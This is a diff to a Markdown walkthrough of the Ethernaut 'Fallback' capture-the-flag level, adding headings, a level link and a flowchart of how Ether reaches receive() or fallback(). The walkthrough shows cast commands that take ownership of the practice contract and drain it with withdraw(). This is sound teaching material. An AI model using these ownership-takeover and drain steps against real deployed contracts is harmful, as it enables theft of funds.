@@ -1,5 +1,7 @@
 # 1. Fallback 
 
+## Problem Outline
+
 **Difficulty : 1/10**
 
 You will beat this level if:
@@ -58,6 +60,7 @@ contract Fallback {
 
 We need to trigger the callback function after having contributed some ETH to become the owner.
 
+### Walkthrough
 Contributing some eth using the "contribute()" function
 ```
 cast send $LEVEL_ADDRESS "contribute()" --value 0.0001ether --private-key=$PRIVATE_KEY
@@ -73,3 +76,21 @@ Draining the contract
 cast send $LEVEL_ADDRESS "withdraw()" --private-key $PRIVATE_KEY
 ```
 ## Further Reading
+
+[Link to level on Ethernaut](https://ethernaut.openzeppelin.com/level/0x9CB391dbcD447E645D6Cb55dE6ca23164130D008)
+```
+    Ether is sent to contract?
+                |
+        is msg.data empty?
+                / \
+               /   \
+             yes    no  
+             /       \    
+        receive()    fallback()
+         exist?                      
+        /     \
+       yes     no          
+      /         \
+  receive()     fallback()
+```
+
